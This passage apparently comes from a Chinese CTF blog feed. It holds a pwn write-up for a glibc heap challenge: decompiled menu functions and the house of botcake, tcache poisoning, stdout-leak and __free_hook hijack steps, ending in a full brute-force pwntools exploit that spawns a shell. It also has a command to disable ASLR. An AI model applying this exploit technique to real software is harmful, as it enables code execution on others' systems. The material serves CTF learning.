class="hljs-number">2</span> )<br>      &#123;<br>        Recall();<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>start</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">start</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a book of wishes&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;what&#x27;s your wish?&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>menu</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Promise&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Recall&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice : &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a><strong>gift</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">gift</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> num; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( cnt2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  num = read_num();<br>  <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;heap_ptr + num));<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)++cnt2;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a><strong>Promise</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">Promise</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">int</span> num; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br><br>  <span class="hljs-keyword">if</span> ( !cnt1 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Human greed is never ending!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;One day you will regret&quot;</span>);<br>    ++cnt1;<br>  &#125;<br>  result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)cnt_p;<br>  <span class="hljs-keyword">if</span> ( cnt_p &lt;= <span class="hljs-number">18</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: &quot;</span>);<br>    num = read_num();<br>    <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">256</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    v1 = cnt;<br>    *((_QWORD *)&amp;heap_ptr + v1) = <span class="hljs-built_in">malloc</span>(num);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: &quot;</span>);<br>    read(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;heap_ptr + cnt), num);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!\n&quot;</span>);<br>    ++cnt;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)++cnt_p;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Recall"><a href="#Recall" class="headerlink" title="Recall"></a><strong>Recall</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Recall</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( cnt2 &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is now an opportunity to withdraw, but sometimes...&quot;</span>);<br>  result = cnt_r;<br>  <span class="hljs-keyword">if</span> ( cnt_r &lt;= <span class="hljs-number">10</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>    result = read_num();<br>    v1 = result;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)result &lt;= <span class="hljs-number">0x11</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*((_QWORD *)&amp;heap_ptr + result) )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      &#125;<br>      <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;heap_ptr + result));<br>      *((_QWORD *)&amp;heap_ptr + v1) = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!\n&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h2><p><strong>1&#x2F;256概率</strong></p><p><strong>调试时， 关闭本地地址随机化</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo su</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br></code></pre></td></tr></table></figure><h3 id="House-of-botcake构造"><a href="#House-of-botcake构造" class="headerlink" title="House of botcake构造"></a>House of botcake构造</h3><p><strong>原因：</strong></p><p>Glibc 2.29下，tcache 增加了 key 字段, 不能简单的实现tcache-dup，需要覆盖key，才能double free</p><p><strong>house of botcake：</strong>在填满tcache后，释放两个连续的相邻的chunk(chunk7 和chunk8)，使其合并为unsorted bin。再从tcache中申请一个chunk，再释放。此时的chunk同时存在于unsorted bin和tcache bin 中，所以不会有key字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1. house of botcake</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>  add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0-6</span><br>  <br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#7</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>      free(i) <br>      <br>gift(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-comment">#10</span><br>free(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>利用<code>botcake</code>手法，通过唯一一次UAF，使得<code>chunk8</code>同时位于<code>unsorted bin</code>和<code>tcache bin</code>，使其绕过<code>高版本下tcache的fd存在key</code>这一问题</p><p>此时，形成类似<code>tcache poioning</code>的效果</p><p><img src="/../md/6.png" alt="img"></p><h3 id="覆盖堆残留的main-arena-1-x2F-16"><a href="#覆盖堆残留的main-arena-1-x2F-16" class="headerlink" title="覆盖堆残留的main_arena(1&#x2F;16)"></a>覆盖堆残留的main_arena(1&#x2F;16)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#2. tcache poisoning--&gt; unsorted bin</span><br><span class="hljs-comment"># tcache_perthread_struct: p16(0x8010)</span><br><span class="hljs-comment"># heap leave libc: p16(0x566d)</span><br><span class="hljs-comment"># unsorted bin: p16(0x5690)</span><br>add(<span class="hljs-number">0x50</span>, p16(<span class="hljs-number">0xe66d</span>)) <span class="hljs-comment">#11</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p16(<span class="hljs-number">0x9690</span>) <br>add(<span class="hljs-number">0x40</span>, payload1) <span class="hljs-comment">#12, Attacker</span><br></code></pre></td></tr></table></figure><p>切割<code>unsorted bin</code>, 获得一块堆，残留有<code>main_arena+96</code>, 同时覆盖两个字节( 其中半字节需要爆破, 1&#x2F;16 )</p><p>第二次申请堆，形成<code>overlapping</code>，使<code>tcache</code>的<code>next</code>指向堆残留处（远程下需要爆破半字节，1&#x2F;16概率，所以为1&#x2F;256的概率）</p><p>（需要注意的是tcache bin指向的是chunk的data部分）</p><p><img src="/../md/7.png" alt="img"></p><h3 id="打-IO-2-1-stdout-1-x2F-16"><a href="#打-IO-2-1-stdout-1-x2F-16" class="headerlink" title="打_IO_2_1_stdout(1&#x2F;16)"></a><strong>打_IO_2_1_stdout(1&#x2F;16)</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#3. IO_2_1_stdout_</span><br><span class="hljs-comment"># _IO_2_1_stdout_ -0x43: p16(0x565d)</span><br><span class="hljs-comment"># tcache --&gt; _IO_2_1_stdout_-0x33: p16(0x566d)</span><br><span class="hljs-comment"># _IO_2_1_stdout--leak libc</span><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x33</span> +p64(<span class="hljs-number">0xfbad1800</span>) +p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +<span class="hljs-string">b&#x27;\x00&#x27;</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-comment">#13</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-comment">#14</span><br>add(<span class="hljs-number">0x80</span>, payload2) <span class="hljs-comment">#15</span><br>    <br>    <span class="hljs-comment">#leak libc</span><br>stdout = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">96</span><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">0.1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-stdout<br><br><span class="hljs-keyword">if</span> libc_base == -stdout:<br>        exit(-<span class="hljs-number">1</span>)<br><br>libc_base += <span class="hljs-number">0xd80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br>__free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__free_hook))<br></code></pre></td></tr></table></figure><p>在对应位置 <code>_IO_2_1_stdout_-0x43</code>存在一块<code>0x7f</code>大小的<code>chunk</code></p><p><img src="/../md/8.png" alt="img"></p><p>所以需要指向其<code>data</code>部分，即<code>0x7ffff7fae66d</code>,覆写，使得<code>_IO_2_1_stdout_</code>绕过限制，输出</p><p><img src="/../md/9.png" alt="img"></p><p>之后接受<code>libc</code>，写地址</p><h3 id="重利用house-of-botcake"><a href="#重利用house-of-botcake" class="headerlink" title="重利用house of botcake"></a>重利用house of botcake</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#4. Second--house of botcke</span><br>free(<span class="hljs-number">13</span>)<br>free(<span class="hljs-number">12</span>)<br></code></pre></td></tr></table></figure><p>释放前面构造<code>overlapping</code>的<code>chunk</code>和<code>tcahe bin</code></p><p>使再一次<code>tcache poing</code>成为可能</p><p><img src="/../md/10.png" alt="img"></p><h3 id="劫持free-hook"><a href="#劫持free-hook" class="headerlink" title="劫持free_hook"></a>劫持free_hook</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#5.exit_hook</span><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(__free_hook) <br>add(<span class="hljs-number">0x40</span>, payload3) <span class="hljs-comment">#16</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment">#17</span><br>add(<span class="hljs-number">0x80</span>, p64(system)) <span class="hljs-comment">#18</span><br>free(<span class="hljs-number">17</span>)<br></code></pre></td></tr></table></figure><p>再次构造<code>overlapping</code>，劫持<code>free_hook</code>，使其修改为<code>system</code></p><p><img src="/../md/11.png" alt="img"></p><p>申请一块堆写上<code>&quot;/bin/sh\x00&quot;</code></p><p><img src="/../md/12.png" alt="img"></p><p><strong>Get Shell</strong></p><p><img src="/../md/13.png" alt="img"></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp:"></a>Exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>libc = ELF(<span class="hljs-string">&#x27;/pwn/libc&#x27;</span>)<br><br>banary = <span class="hljs-string">&quot;/pwn/pwn&quot;</span><br>elf = ELF(banary)<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data) <br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s            : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, con</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>s(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">9</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br><span class="hljs-comment">#1. house of botcake</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>  add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0-6</span><br>  <br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#7</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>      free(i) <span class="hljs-comment">#1-7</span><br>gift(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-comment">#10</span><br>free(<span class="hljs-number">8</span>)<br><br><span class="hljs-comment">#2. tcache poisoning--&gt; unsorted bin</span><br><span class="hljs-comment"># tcache_perthread_struct: p16(0x8010)</span><br><span class="hljs-comment"># heap leave libc: p16(0x566d)</span><br><span class="hljs-comment"># unsorted bin: p16(0x5690)</span><br>add(<span class="hljs-number">0x50</span>, p16(<span class="hljs-number">0x966d</span>)) <span class="hljs-comment">#11</span><br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p16(<span class="hljs-number">0x9690</span>) <br>add(<span class="hljs-number">0x40</span>, payload1) <span class="hljs-comment">#12, Attacker</span><br><br><span class="hljs-comment">#3. _IO_2_1_stdout_</span><br><span class="hljs-comment"># _IO_2_1_stdout_ -131-0x43: p16(0x565d)</span><br><span class="hljs-comment"># tcache --&gt; _IO_2_1_stdout_ -131-0x33: p16(0x566d)</span><br><span class="hljs-comment"># _IO_2_1_stdout--leak libc</span><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-comment">#13</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-comment">#14</span><br>add(<span class="hljs-number">0x80</span>, payload2) <span class="hljs-comment">#15</span><br><br><span class="hljs-comment">#leak libc</span><br>stdout = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">96</span><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">0.1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-stdout<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-keyword">if</span> libc_base == -stdout:<br>        exit(-<span class="hljs-number">1</span>)<br>        <br>libc_base += <span class="hljs-number">0xd80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br><br>__free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__free_hook))<br><br><span class="hljs-comment">#4. Second--house of botcke</span><br>free(<span class="hljs-number">13</span>)<br>free(<span class="hljs-number">12</span>)<br><br><span class="hljs-comment">#5.exit_hook</span><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(__free_hook) <br>add(<span class="hljs-number">0x40</span>, payload3) <span class="hljs-comment">#16</span><br><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment">#17</span><br>add(<span class="hljs-number">0x80</span>, p64(system)) <span class="hljs-comment">#18</span><br><span class="hljs-comment">#debug()</span><br>free(<span class="hljs-number">17</span>)<br><br>pi()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p=process(&#x27;./pwn/pwn&#x27;)</span><br><span class="hljs-string">pwn()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p=process(<span class="hljs-string">&#x27;/pwn/pwn&#x27;</span>)<br>        <span class="hljs-comment">#p = remote(&#x27;106.13.218.xxx&#x27;,&#x27;10000&#x27;)</span><br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn题docker搭建</title>
    <link href="/2022/10/16/Pwn%E9%A2%98%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/10/16/Pwn%E9%A2%98%E6%90%AD%E5%BB%BA/</url>
    
